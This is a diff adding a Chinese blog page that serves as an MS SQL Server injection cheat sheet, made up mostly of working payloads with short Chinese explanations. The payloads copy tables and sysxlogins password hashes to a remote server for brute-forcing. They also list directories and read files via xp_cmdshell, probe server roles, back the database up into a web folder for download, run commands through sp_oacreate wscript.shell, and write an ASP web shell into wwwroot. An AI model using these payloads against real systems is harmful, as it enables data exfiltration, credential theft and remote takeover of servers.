+<span class="x">insert into OPENROWSET(SQLOLEDB, server=servername; uid=sa; pwd=123, select * from table1) select * from table2</span>
+<span class="x">这行语句将目标主机上table2表中的所有数据复制到远程数据库中的table1表中。实际运用中适当修改连接字符串的IP地址和端口，指向需要的地方，比如：</span>
+<span class="x">insert into OPENROWSET(SQLOLEDB, uid=sa; pwd=123; Network=DBMSSOCN; Address=192.168.0.1, 1433; , select * from table1) select * from</span>
+<span class="x">table2</span>
+<span class="x">insert into OPENROWSET(SQLOLEDB, uid=sa; pwd=123; Network=DBMSSOCN; Address=192.168.0.1, 1433; , select * from _sysdatabases)</span>
+<span class="x">select * from master.dbo.sysdatabases</span>
+<span class="x">insert into OPENROWSET(SQLOLEDB, uid=sa; pwd=123; Network=DBMSSOCN; Address=192.168.0.1, 1433; , select * from _sysobjects)</span>
+<span class="x">select * from user_database.dbo.sysobjects</span>
+<span class="x">insert into OPENROWSET(SQLOLEDB, uid=sa; pwd=123; Network=DBMSSOCN; Address=192.168.0.1, 1433; , select * from _syscolumns)</span>
+<span class="x">select * from user_database.dbo.syscolumns</span>
+<span class="x">复制数据库：</span>
+
+<span class="x">insert into OPENROWSET(SQLOLEDB, uid=sa; pwd=123; Network=DBMSSOCN; Address=192.168.0.1, 1433; , select * from table1) select * from database..table1 insert into OPENROWSET(SQLOLEDB, uid=sa; pwd=123; Network=DBMSSOCN; Address=192.168.0.1, 1433; , select * from table2) select * fromdatabase..table2</span>
+<span class="x">复制哈西表（HASH）登录密码的hash存储于sysxlogins中。方法如下：</span>
+<span class="x">insert into OPENROWSET(SQLOLEDB, uid=sa; pwd=123; Network=DBMSSOCN; Address=192.168.0.1, 1433; , select * from _sysxlogins) select</span>
+
+<span class="x">    from database.dbo.sysxlogins</span>
+
+<span class="x">得到hash之后，就可以进行暴力破解。</span>
+<span class="x">遍历目录的方法：先创建一个临时表：temp</span>
+
+<span class="x">create table temp(id nvarchar(255), num1 nvarchar(255), num2 nvarchar(255), num3 nvarchar(255)); --</span>
+<span class="x">insert temp exec master.dbo.xp_availablemedia; -- 获得当前所有驱动器</span>
+<span class="x">insert into temp(id) exec master.dbo.xp_subdirs c</span>
+<span class="x">    \; -- 获得子目录列表</span>
+<span class="x">insert into temp(id, num1) exec master.dbo.xp_dirtree c</span>
+<span class="x">    \; -- 获得所有子目录的目录树结构，并寸入temp表中</span>
+<span class="x">insert into temp(id) exec master.dbo.xp_cmdshell type c</span>
+<span class="x">    \web\index.asp; -- 查看某个文件的内容</span>
+<span class="x">insert into temp(id) exec master.dbo.xp_cmdshell dir c</span>
+<span class="x">    \; --</span>
+<span class="x">insert into temp(id) exec master.dbo.xp_cmdshell dir c</span>
+<span class="x">    \ *.asp /s/a; --</span>
+<span class="x">insert into temp(id) exec master.dbo.xp_cmdshell cscript. C</span>
+<span class="x">    \Inetpub\AdminScripts\adsutil.vbs enum w3svc</span>
+<span class="x">insert into temp(id, num1) exec master.dbo.xp_dirtree c</span>
+<span class="x">    \; -- （xp_dirtree适用权限PUBLIC）</span>
+
+<span class="x">写入表：</span>
+<span class="x">语句1：and 1=(SELECT IS_SRVROLEMEMBER(sysadmin)); --</span>
+<span class="x">语句2：and 1=(SELECT IS_SRVROLEMEMBER(serveradmin)); --</span>
+<span class="x">语句3：and 1=(SELECT IS_SRVROLEMEMBER(setupadmin)); --</span>
+<span class="x">语句4：and 1=(SELECT IS_SRVROLEMEMBER(securityadmin)); --</span>
+<span class="x">语句5：and 1=(SELECT IS_SRVROLEMEMBER(securityadmin)); --</span>
+<span class="x">语句6：and 1=(SELECT IS_SRVROLEMEMBER(diskadmin)); --</span>
+<span class="x">语句7：and 1=(SELECT IS_SRVROLEMEMBER(bulkadmin)); --</span>
+<span class="x">语句8：and 1=(SELECT IS_SRVROLEMEMBER(bulkadmin)); --</span>
+<span class="x">语句9：and 1=(SELECT IS_MEMBER(db_owner)); --</span>
+<span class="x">把路径写到表中去：</span>
+
+<span class="x">create table dirs(paths varchar(100), id int)--</span>
+<span class="x">insert dirs exec master.dbo.xp_dirtree c</span>
+<span class="x">    \--</span>
+
+<span class="x">and 0&lt;&gt;(select top 1 paths from dirs)--</span>
+<span class="x">and 0&lt;&gt;(select top 1 paths from dirs where paths not in(@Inetpub))--</span>
+
+<span class="x">create table dirs1(paths varchar(100), id int)--</span>
+<span class="x">insert dirs exec master.dbo.xp_dirtree e</span>
+<span class="x">    \web--</span>
+
+<span class="x">and 0&lt;&gt;(select top 1 paths from dirs1)--</span>
+<span class="x">把数据库备份到网页目录：下载</span>
+
+<span class="x">declare @a sysname;  set @a=db_name(); backup database @a to disk=e</span>
+<span class="x">    \web\down.bak; --</span>
+
+<span class="x">and 1=(Select top 1 name from(Select top 12 id, name from sysobjects where xtype=char(85)) T order by id desc)</span>
+<span class="x">and 1=(Select Top 1 col_name(object_id(USER_LOGIN), 1) from sysobjects) 参看相关表。</span>
+<span class="x">and 1=(select user_id from USER_LOGIN)</span>
+<span class="x">and 0=(select user from USER_LOGIN where user&gt;1)</span>
+<span class="x">-=-wscript.shellexample -=-</span>
+<span class="x">declare @o int</span>
+<span class="x">exec sp_oacreate wscript.shell, @o out</span>
+<span class="x">exec sp_oamethod @o, run, NULL, notepad.exe</span>
+
+<span class="x">declare @o int exec sp_oacreate wscript.shell, @o out exec sp_oamethod @o, run, NULL, notepad.exe--</span>
+
+<span class="x">declare @o int, @f int, @t int, @ret int</span>
+<span class="x">declare @line varchar(8000)</span>
+<span class="x">exec sp_oacreate scripting.filesystemobject, @o out</span>
+<span class="x">exec sp_oamethod @o, opentextfile, @f out, c:\boot.ini, 1</span>
+<span class="x">exec @ret = sp_oamethod @f, readline, @line out</span>
+<span class="x">while( @ret = 0 )</span>
+<span class="x">begin</span>
+<span class="x">print @line</span>
+<span class="x">exec @ret = sp_oamethod @f, readline, @line out</span>
+<span class="x">end</span>
+<span class="x">declare @o int, @f int, @t int, @ret int</span>
+<span class="x">exec sp_oacreate scripting.filesystemobject, @o out</span>
+<span class="x">exec sp_oamethod @o, createtextfile, @f out, c:\inetpub\wwwroot\foo.asp, 1</span>
+<span class="x">exec @ret = sp_oamethod @f, writeline, NULL, </span>
+<span class="cp">&lt;%</span> <span class="n">set</span> <span class="n">o</span> <span class="o">=</span> <span class="n">server</span><span class="o">.</span><span class="n">createobject</span><span class="p">(</span><span class="s2">&quot;wscript.shell&quot;</span><span class="p">):</span> <span class="n">o</span><span class="o">.</span><span class="n">run</span><span class="p">(</span> <span class="n">request</span><span class="o">.</span><span class="n">querystring</span><span class="p">(</span><span class="s2">&quot;cmd&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="cp">%&gt;</span><span class="x"></span>
+<span class="x">declare @o int, @ret int</span>
+<span class="x">exec sp_oacreate speech.voicetext, @o out</span>
+<span class="x">exec sp_oamethod @o, register, NULL, foo, bar</span>
+<span class="x">exec sp_oasetproperty @o, speed, 150</span>
+<span class="x">exec sp_oamethod @o, speak, NULL, all your sequel servers are belong to, us, 528 waitfor delay 00:00:05</span>
+
+<span class="x">declare @o int, @ret int exec sp_oacreate speech.voicetext, @o out exec sp_oamethod @o, register, NULL, foo, bar exec</span>
+
+<span class="x">sp_oasetproperty @o, speed, 150 exec sp_oamethod @o, speak, NULL, all your sequel servers are belong to us, 528 waitfor delay 00:00:05--</span>
+<span class="x">xp_dirtree适用权限PUBLIC</span>
+<span class="x">exec master.dbo.xp_dirtree c:\</span>
+<span class="x">返回的信息有两个字段subdirectory、depth。Subdirectory字段是字符型，depth字段是整形字段。</span>
+<span class="x">create table dirs(paths varchar(100), id int)</span>
+<span class="x">建表，这里建的表是和上面xp_dirtree相关连，字段相等、类型相同。</span>
+<span class="x">insert dirs exec master.dbo.xp_dirtree c:\</span>
+<span class="x">只要我们建表与存储进程返回的字段相定义相等就能够执行！达到写表的效果.</span>
+</pre></div>
+    </div>
+  </div>
+  <hr class="separator">
+  <div class="col-md-8 col-md-offset-2">
+  <div id="disqus_thread">
+    <script>
+      var disqus_shortname = 'liandesinian';
+      (function() {
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] ||
+         document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+    </script>
+    <noscript>
+      Please enable JavaScript to view the
+      <a href="https://disqus.com/?ref_noscript=liandesinian">
+        comments powered by Disqus.
+      </a>
+    </noscript>
+    <a href="https://disqus.com" class="dsq-brlink">
+      blog comments powered by <span class="logo-disqus">Disqus</span>
+    </a>
+  </div>
+  </div>
+  </div>
+<footer class="footer">
+  <div class="container">
+    <p class="text-center">
+      莲的思念, <a href="" target="_blank"></a> unless otherwise noted.
+    </p>
+    <div class="text-center">
+      Generated by <a href="http://getpelican.com" target="_blank">Pelican</a> with the <a href="http://github.com/nairobilug/pelican-alchemy">alchemy</a> theme.
+    </div>
+  </div>
+</footer> <!-- /.footer -->
+  <script src="/theme/js/jquery.min.js"></script>
+  <script src="/theme/js/bootstrap.min.js"></script>
+</body> <!-- 42 -->
+
+</html>
